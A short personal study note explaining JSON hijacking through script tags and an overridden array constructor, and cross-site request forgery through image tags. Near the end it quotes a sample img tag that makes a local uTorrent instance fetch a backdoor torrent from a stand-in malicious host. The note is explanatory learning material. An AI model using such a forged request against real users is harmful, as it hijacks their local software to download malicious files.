JSON Hijacking
==============

Date of Writing: June 15, 2016
http://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses

I don't think this is a problem anymore
http://stackoverflow.com/questions/16289894/is-json-hijacking-still-an-issue-in-modern-browsers/16880162#16880162
(maybe it still is on some older browsers) but when I was going through this
angular tutorial about HTTP
https://angular.io/docs/ts/latest/guide/server-communication.html they
mentioned that the reason their test API returned a JSON object with a "data"
member pointing to a JSON array rather than just returning the array was
because of a "security concern" and they linked to this page:
https://www.owasp.org/index.php/OWASP_AJAX_Security_Guidelines#Always_return_JSON_with_an_Object_on_the_outside

Apparently the issue is as follows:

1. You login into some secure site. That site has a GET endpoint which returns
   some of your sensitive information as json. Maybe that endpoint looks like
   this: http://sensitive.info.com?json=true
2. You visit a malicious site. This malicious site can NOT make AJAX requests
   to http://sensitive.info.com?json=true because of the same origin policy.
   But the same origin policy doesn't apply to `<script>` tags, those tags
   just GET whatever they point to and evaluate the javascript they get back.
   Normally that wouldn't be so bad, the GET request in this example returns
   an array which is evaluated, done. But javascript is apparently extremely
   hackable/configurable. In this instance javascript lets you override the
   global array constructor. So you can configure some javascript code to run
   every time an array value gets set. So they could configure the array
   constructor to store the sensitive information returned from that GET
   request.

IMG tags
--------

I found this article from one of the above links:
https://en.wikipedia.org/wiki/Cross-site_request_forgery

I remember hearing about how images could cause security issues and I think
this could be why. In the example they gave the application uTorrent could be
controlled through GET requests to localhost:8080. So somebody could post an
img tag like this `<img
src="http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent">`
in a forum or something. Then if someone visited that forum the img tag would
end up making a GET request. If the user was running that torrent application
then it would start downloading some malicious torrent. Interesting!
